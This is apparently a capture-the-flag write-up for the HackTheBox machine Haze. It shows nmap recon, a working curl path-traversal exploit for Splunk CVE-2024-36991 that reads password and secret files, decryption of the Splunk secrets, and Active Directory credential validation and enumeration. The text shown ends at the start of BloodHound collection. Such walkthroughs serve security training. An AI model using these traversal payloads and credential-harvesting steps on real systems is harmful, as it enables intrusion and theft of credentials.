---
title: HTB: Haze
url: https://0xdf.gitlab.io/2025/06/28/htb-haze.html
date: 2025-06-28T13:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: ctf, hackthebox, htb-haze, nmap, windows, active-directory, netexec, splunk, splunk-enterprise, cve-2024-36991, directory-traversal, file-read, splunksecrets, password-spray, rusthound-ce, bloodhound, bloodhound-ce, bloodhound-python, gmsa, windows-acl, bloodyad, gettgt, shadow-credential, certipy, splunk-app, reverse-shell-splunk, seimpersonate, godpotato
---

![Haze](/img/haze-cover.png)

Haze is built around an instance of Splunk Enterprise. I’ll start by exploiting a directory traversal / file read in Splunk that allows me to leak configuration files that container encrypted passwords. I’ll exfil the key and decrypt them, finding a password that’s reused by a user. That user has limited access, but I’m able to spray the password and find a second user with the same password. That user can abuse some Windows ACLs to get access to the gMSA password for a service account. I’ll use that account to get a Shadow Credential for the next user. From there I’ll access a Splunk backup archive, and find older passwords that work for the admin account on the Splunk website. I’ll upload a malicious Splunk application to get a shell as the next user. That shell has the SeImpersonatePrivilege, which I’ll abuse with GodPotato to get system access.

## Box Info

| Name | [Haze](https://hackthebox.com/machines/haze)  [Haze](https://hackthebox.com/machines/haze) [Play on HackTheBox](https://hackthebox.com/machines/haze) |
| --- | --- |
| Release Date | [29 Mar 2025](https://twitter.com/hackthebox_eu/status/1904956546708054435) |
| Retire Date | 28 Jun 2025 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Haze |
| Radar Graph | Radar chart for Haze |
| First Blood User | 02:02:08[Mojo098 Mojo098](https://app.hackthebox.com/users/647734) |
| First Blood Root | 02:47:01[zer0dave zer0dave](https://app.hackthebox.com/users/721418) |
| Creator | [EmSec EmSec](https://app.hackthebox.com/users/962022) |

## Recon

### Initial Scanning

`nmap` finds 30 open TCP ports:

```

oxdf@hacky$ nmap -p- -vvv --min-rate 10000 10.10.11.61
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 16:44 UTC
...[snip]...
Nmap scan report for 10.10.11.61
Host is up, received reset ttl 127 (0.092s latency).
Scanned at 2025-06-23 16:44:52 UTC for 8s
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
8000/tcp  open  http-alt         syn-ack ttl 127
8088/tcp  open  radan-http       syn-ack ttl 127
8089/tcp  open  unknown          syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
63514/tcp open  unknown          syn-ack ttl 127
63967/tcp open  unknown          syn-ack ttl 127
63968/tcp open  unknown          syn-ack ttl 127
63969/tcp open  unknown          syn-ack ttl 127
63978/tcp open  unknown          syn-ack ttl 127
63997/tcp open  unknown          syn-ack ttl 127
64006/tcp open  unknown          syn-ack ttl 127
64079/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.66 seconds
           Raw packets sent: 82609 (3.635MB) | Rcvd: 65536 (2.622MB)
oxdf@hacky$ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,8000,8088,8089,9389 -sCV 10.10.11.61
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 16:45 UTC
Nmap scan report for 10.10.11.61
Host is up (0.092s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-24 00:48:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp open  http          Splunkd httpd
|_http-server-header: Splunkd
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F
| http-robots.txt: 1 disallowed entry
|_/
8088/tcp open  ssl/http      Splunkd httpd
|_http-server-header: Splunkd
|_http-title: 404 Not Found
| http-robots.txt: 1 disallowed entry
|_/
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2025-03-05T07:29:08
|_Not valid after:  2028-03-04T07:29:08
8089/tcp open  ssl/http      Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2025-03-05T07:29:08
|_Not valid after:  2028-03-04T07:29:08
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: splunkd
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-06-24T00:49:46
|_  start_date: N/A
|_clock-skew: 8h02m56s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.95 seconds

```

The box shows many of the ports associated with a [Windows Domain Controller](/cheatsheets/os#windows-domain-controller). The domain is `haze.htb`, and the hostname is `dc01`.

There’s also HTTP services reporting as Splunk on 8000, 8088, and 8089.

I’ll generate a `hosts` entry using `netexec` and add it to my `hosts` file:

```

oxdf@hacky$ netexec smb 10.10.11.61 --generate-hosts-file hosts
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
oxdf@hacky$ cat hosts 
10.10.11.61     DC01.haze.htb haze.htb DC01
oxdf@hacky$ cat hosts /etc/hosts | sponge /etc/hosts

```

### SMB - TCP 445

Guest or anonymous auth doesn’t work here:

```

oxdf@hacky$ netexec smb 10.10.11.61 -u guest -p ''
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [-] haze.htb\guest: STATUS_ACCOUNT_DISABLED 
oxdf@hacky$ netexec smb 10.10.11.61 -u oxdf -p ''
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [-] haze.htb\oxdf: STATUS_LOGON_FAILURE 

```

I’ll have to check back once I acquire some creds.

### Splunk

#### Background

[Splunk](https://www.splunk.com/en_us/blog/learn/what-splunk-does.html) Enterprise is a security information and event management (SIEM) platform. It takes in all kinds of log and other data, processes and indexes it so that it can be easily searched against, and allows for creating of rules that will generate actions and dashboards to show trends and outliers. It is very common in security operation centers (SOCs).

[This page](https://help.splunk.com/en/splunk-enterprise/administer/inherit-a-splunk-deployment/9.0/inherited-deployment-tasks/components-and-their-relationship-with-the-network) from the Splunk docs shows the different ports involved in a Splunk deployment. Three of the ports / services in that list are present on Haze. 8000 is part of the “search head / indexer” and is used for web access. 8089 is the REST API. And 8088 is the HTTP event collector (HEC).

#### Splunk Web - TCP 8000

Visiting port 8000 in a web browser returns a redirect to `/en-US/account/login?return_to=%2Fen-US%2F`, a Splunk login page:

![image-20250623134355318](/img/image-20250623134355318.png)

The [Splunk User Guide](https://docs.splunk.com/Documentation/VMW/4.0.4/User/Loginandgetstarted) suggests that the default creds are admin / changeme, but they don’t work here.

Not much else I can enumerate here without creds.

#### Splunk HEC - TCP 8080

This service offers HTTPS. The TLS certificate doesn’t offer anything interesting, and the page simply returns 404 not found:

![image-20250623181537355](/img/image-20250623181537355.png)

That looks exactly like the [default Apache 404 page](/cheatsheets/404#apache--httpd) with `ServerSignature Off` configured.

#### Splunk API - TCP 8089

Visiting port 8089 shows the “Splunk Atom Feed”:

![image-20250623181700881](/img/image-20250623181700881.png)

At the top I’ll note that it’s running version 9.2.1.

Not important to the box, but it’s interesting to note that the response from the server is actually an XML file:

```

<?xml version="1.0" encoding="UTF-8"?>
<!--This is to override browser formatting; see server.conf[httpServer] to disable. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .-->
<?xml-stylesheet type="text/xml" href="/static/atom.xsl"?>
<feed xmlns="http://www.w3.org/2005/Atom" xmlns:s="http://dev.splunk.com/ns/rest">
  <title>splunkd</title>
  <id>https://haze.htb:8089/</id>
  <updated>2025-06-23T23:19:35-07:00</updated>
  <generator build="78803f08aabb" version="9.2.1"/>
  <author>
    <name>Splunk</name>
  </author>
  <entry>
    <title>rpc</title>
    <id>https://haze.htb:8089/rpc</id>
    <updated>1969-12-31T16:00:00-08:00</updated>
    <link href="/rpc" rel="alternate"/>
  </entry>
  <entry>
    <title>services</title>
    <id>https://haze.htb:8089/services</id>
    <updated>1969-12-31T16:00:00-08:00</updated>
    <link href="/services" rel="alternate"/>
  </entry>
  <entry>
    <title>servicesNS</title>
    <id>https://haze.htb:8089/servicesNS</id>
    <updated>1969-12-31T16:00:00-08:00</updated>
    <link href="/servicesNS" rel="alternate"/>
  </entry>
  <entry>
    <title>static</title>
    <id>https://haze.htb:8089/static</id>
    <updated>1969-12-31T16:00:00-08:00</updated>
    <link href="/static" rel="alternate"/>
  </entry>
</feed>

```

The third line has a reference to an xml-stylesheet at `/static/atom.xsl`, which provides the structure and CSS to convert it to a nicely formatted page.

## Auth as paul.taylor

### CVE-2024-36991

#### Identify

Splunk has a [security advisories page](https://advisory.splunk.com/advisories). I’ll look for vulnerabilities before mid-March 2025 (when Haze released) where the severity is critical and there are none that look interesting. I’ll drop severity to high, and remove “Third-Party Package” issues, and there are a few 2024 CVEs that look interesting:

![image-20250623202623231](/img/image-20250623202623231.png)

The [release notes for version 9.2.1](https://help.splunk.com/en/splunk-enterprise/release-notes-and-updates/release-notes/9.2/fixed-issues/fixed-issues/splunk-enterprise-9.2.1-fixed-issues) show it fixing a lot of issues from Feb 2024, so that limits it to about what’s shown above. When I ignore the ones that require auth, there’s only one left, CVE-2024-36991.

#### Background

[CVE-2024-36991](https://nvd.nist.gov/vuln/detail/cve-2024-36991) is described as:

> In Splunk Enterprise on Windows versions below 9.2.2, 9.1.5, and 9.0.10, an attacker could perform a path traversal on the /modules/messaging/ endpoint in Splunk Enterprise on Windows. This vulnerability should only affect Splunk Enterprise on Windows.

It’s a directory traversal vulnerability leading to file read for Splunk Enterprise on Windows for versions below 9.2.2. That seems like a perfect fit. The [Splunk advisory](https://advisory.splunk.com/advisories/SVD-2024-0711) adds:

> The vulnerability exists because the Python `os.path.join` function removes the drive letter from path tokens if the drive in the token matches the drive in the built path.

There were a fair number of news stories about this vulnerability in July 2024:

![image-20250623211506235](/img/image-20250623211506235.png)

#### POC

[This post](https://www.vicarius.io/vsociety/posts/exploiting-path-traversal-in-splunk-cve-2024-36991) from vsociety gives a short breakdown of a POC. The critical point is to use a path such as `/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd`. I’ve looked at simple `os.path.join` vulnerabilities before, but this is more complex. The server must be breaking apart the URL path and parsing it one section at a time. Regardless, I’ll give it a try:

```

oxdf@hacky$ curl --path-as-is 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd'
:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152

```

It works!

This path may look a bit confusing for a Windows host. The Splunk configuration files are stored in the `etc` directory inside the Splunk installation directory, on Windows typically `C:\Program Files\Splunk\etc`. I can test this by adding additional `C:../` to get up to the root of `C:` and then back into the `Splunk` directory:

```

oxdf@hacky$ curl --path-as-is 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/passwd'
:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152

```

It works!

### Filesystem Enumeration

The `passwd` file has hashes for accounts on the Splunk web login. There are other interesting files I might want to check out with the Splunk configuration. [This page](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.1-configuration-file-reference) in the Splunk docs shows a ton of `conf` files with links to a page on each. Many of these files have the default versions in `etc/system/default`, and user updates are made in `etc/system/local`. Most of these files don’t exist in `etc/system/local` on Haze, which makes them less interesting.

In poking around for these files, I’ll find a few interesting files. `etc/system/local/authentication.conf` has LDAP binding information for a user named Paul Taylor:

```

oxdf@hacky$ curl --path-as-is 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf'
[splunk_auth]
minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0

[Haze LDAP Auth]
SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname

[authentication]
authSettings = Haze LDAP Auth
authType = LDAP

```

I’ll note that hash.

`server.conf` has a couple hashes as well:

```

oxdf@hacky$ curl --path-as-is 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/server.conf'
[general]
serverName = dc01
pass4SymmKey = $7$lPCemQk01ejJvI8nwCjXjx7PJclrQJ+SfC3/ST+K0s+1LsdlNuXwlA==

[sslConfig]
sslPassword = $7$/nq/of9YXJfJY+DzwGMxgOmH4Fc0dgNwc5qfCiBhwdYvg9+0OCCcQw==

[lmpool:auto_generated_pool_download-trial]
description = auto_generated_pool_download-trial
peers = *
quota = MAX
stack_id = download-trial

[lmpool:auto_generated_pool_forwarder]
description = auto_generated_pool_forwarder
peers = *
quota = MAX
stack_id = forwarder

[lmpool:auto_generated_pool_free]
description = auto_generated_pool_free
peers = *
quota = MAX
stack_id = free

[license]
active_group = Forwarder

```

I’ll also want to grab `etc/auth/splunk.secret`, which will be necessary to decrypt these hashes later:

```

oxdf@hacky$ curl --path-as-is 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/splunk.secret' -s | tee splunk.secret
NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD

```

### Recover Passwords

#### passwd

There are several hashes in from the `passwd` file that are standard sha512crypt hashes like in a Linux `passwd` file. I’ll run them against `hashcat` and `rockyou.txt` in [mode 1800](https://hashcat.net/wiki/doku.php?id=example_hashes), but none of them crack.

#### Format

`$7$` doesn’t show up in the `hashcat` [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes). Searching for it, the top result is a Python package named `splunksecrets`:

![image-20250624103607374](/img/image-20250624103607374.png)

The [GitHub README](https://github.com/HurricaneLabs/splunksecrets) says:

> Starting in Splunk 7.2, AES256-GCM is used for encryption of secrets, indicated in configuration files by `$7$` in the encrypted password. The `PBKDF2` algorithm is used to derive an encryption key from all 254 bytes of `splunk.secret` (the newline character is stripped from the end of the file), using a static salt of `disk-encryption` and a single iteration. This 256-bit key is then used as the encryption key for AES256-GCM, with a 16-byte randomly generated initialization vector. The encryption produces both the ciphertext as well as a “tag” that is used as part of integrity verification. The iv, ciphertext, and tag (in that order) are concatenated, base64-encoded, and prepended with `$7$` to produce the encrypted password seen in the configuration files. If the key is less than 254-bytes it is padded with null bytes.

The hash is not actually a hash, but rather data encrypted with the value in the `splunk.secret` file. This is actually a case where encryption is less secure than hashing, as the process can be reversed. Personally, I think it’s a bit confusing of Splunk to invent this format, as most (if not all) other `$digit$` formats are hashes.

#### Decrypt

I’ll install the tool using `uv` as shown in the `README` ([uv cheatsheet](/cheatsheets/uv#)), and run it, passing the secret file and the encrypted data:

```

oxdf@hacky$ splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='
Ld@p_Auth_Sp1unk@2k24
oxdf@hacky$ splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$7$lPCemQk01ejJvI8nwCjXjx7PJclrQJ+SfC3/ST+K0s+1LsdlNuXwlA=='
changeme
oxdf@hacky$ splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$7$/nq/of9YXJfJY+DzwGMxgOmH4Fc0dgNwc5qfCiBhwdYvg9+0OCCcQw=='
password

```

Because the data is encrypted and not hashes, there’s no guessing or brute force. The second two seem less useful, but the first looks interesting!

### Validate

The config file shows the user as “CN=Paul Taylor,CN=Users,DC=haze,DC=htb”. I’ll use [username-anarchy](https://github.com/urbanadventurer/username-anarchy) to come up with likely usernames:

```

oxdf@hacky$ ./username-anarchy paul taylor | tee paul_usernames
paul
paultaylor
paul.taylor
paultayl
pault
p.taylor
ptaylor
tpaul
t.paul
taylorp
taylor
taylor.p
taylor.paul
pt

```

Now I can try that password with each using `netexec`:

```

oxdf@hacky$ netexec smb haze.htb -u paul_usernames -p 'Ld@p_Auth_Sp1unk@2k24'
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [-] haze.htb\paul:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [-] haze.htb\paultaylor:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 

```

It’s paul.taylor. paul.taylor cannot WinRM:

```

oxdf@hacky$ netexec winrm haze.htb -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24'
WINRM       10.10.11.61     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) 
WINRM       10.10.11.61     5985   DC01             [-] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24

```

## Shell as mark.adams

### Enumeration

#### SMB Shares

The SMB shares on the box are the default active directory DC shares:

```

oxdf@hacky$ netexec smb haze.htb -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24' --shares
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
SMB         10.10.11.61     445    DC01             [*] Enumerated shares
SMB         10.10.11.61     445    DC01             Share           Permissions     Remark
SMB         10.10.11.61     445    DC01             -----           -----------     ------
SMB         10.10.11.61     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.61     445    DC01             C$                              Default share
SMB         10.10.11.61     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.61     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.61     445    DC01             SYSVOL          READ            Logon server share 

```

There’s nothing interesting on them.

#### SMB User Enum

I’ll try to enumerate users, but there’s a very weird result:

```

oxdf@hacky$ netexec smb haze.htb -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24' --users
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
SMB         10.10.11.61     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.11.61     445    DC01             paul.taylor                   2025-06-24 04:42:30 0        
SMB         10.10.11.61     445    DC01             [*] Enumerated 1 local users: HAZE

```

There must be more than one user on this box / domain. I’ll try a RID bruteforce:

```

oxdf@hacky$ netexec smb haze.htb -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
SMB         10.10.11.61     445    DC01             498: HAZE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.61     445    DC01             500: HAZE\Administrator (SidTypeUser)
SMB         10.10.11.61     445    DC01             501: HAZE\Guest (SidTypeUser)
SMB         10.10.11.61     445    DC01             502: HAZE\krbtgt (SidTypeUser)
SMB         10.10.11.61     445    DC01             512: HAZE\Domain Admins (SidTypeGroup)
SMB         10.10.11.61     445    DC01             513: HAZE\Domain Users (SidTypeGroup)
SMB         10.10.11.61     445    DC01             514: HAZE\Domain Guests (SidTypeGroup)
SMB         10.10.11.61     445    DC01             515: HAZE\Domain Computers (SidTypeGroup)
SMB         10.10.11.61     445    DC01             516: HAZE\Domain Controllers (SidTypeGroup)
SMB         10.10.11.61     445    DC01             517: HAZE\Cert Publishers (SidTypeAlias)
SMB         10.10.11.61     445    DC01             518: HAZE\Schema Admins (SidTypeGroup)
SMB         10.10.11.61     445    DC01             519: HAZE\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.61     445    DC01             520: HAZE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.61     445    DC01             521: HAZE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.61     445    DC01             522: HAZE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.61     445    DC01             525: HAZE\Protected Users (SidTypeGroup)
SMB         10.10.11.61     445    DC01             526: HAZE\Key Admins (SidTypeGroup)
SMB         10.10.11.61     445    DC01             527: HAZE\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.61     445    DC01             553: HAZE\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.61     445    DC01             571: HAZE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.61     445    DC01             572: HAZE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.61     445    DC01             1000: HAZE\DC01$ (SidTypeUser)
SMB         10.10.11.61     445    DC01             1101: HAZE\DnsAdmins (SidTypeAlias)
SMB         10.10.11.61     445    DC01             1102: HAZE\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.61     445    DC01             1103: HAZE\paul.taylor (SidTypeUser)
SMB         10.10.11.61     445    DC01             1104: HAZE\mark.adams (SidTypeUser)
SMB         10.10.11.61     445    DC01             1105: HAZE\edward.martin (SidTypeUser)
SMB         10.10.11.61     445    DC01             1106: HAZE\alexander.green (SidTypeUser)
SMB         10.10.11.61     445    DC01             1107: HAZE\gMSA_Managers (SidTypeGroup)
SMB         10.10.11.61     445    DC01             1108: HAZE\Splunk_Admins (SidTypeGroup)
SMB         10.10.11.61     445    DC01             1109: HAZE\Backup_Reviewers (SidTypeGroup)
SMB         10.10.11.61     445    DC01             1110: HAZE\Splunk_LDAP_Auth (SidTypeGroup)
SMB         10.10.11.61     445    DC01             1111: HAZE\Haze-IT-Backup$ (SidTypeUser)
SMB         10.10.11.61     445    DC01             1112: HAZE\Support_Services (SidTypeGroup)

```

That’s a better list of users for sure. Something is odd with paul.taylor’s permissions.

#### Bloodhound

I’ll use [rusthound-ce](https://github.com/g0h4n/RustHound-CE) (`cargo install rusthound-ce`):

```

oxdf@hacky$ rusthound-ce --domain haze.htb -u paul.taylor -p Ld@p_Auth_Sp1unk@2k24 -c All --zip
---------------------------------------------------
Initializing RustHound-CE at 15:06:43 on 06/24/25
Powered by @g0h4n_0
---------------------------------------------------

[2025-06-24T15:06:43Z INFO  rusthound_ce] Verbosity level: Info
[2025-06-24T15:06:43Z INFO  rusthound_ce] Collection method: All
[2025-06-24T15:06:43Z INFO  rusthound_ce::ldap] Connected to HAZE.HTB Active Directory!
[2025-06-24T15:06:43Z INFO  rusthound_ce::ldap] Starting data collection...
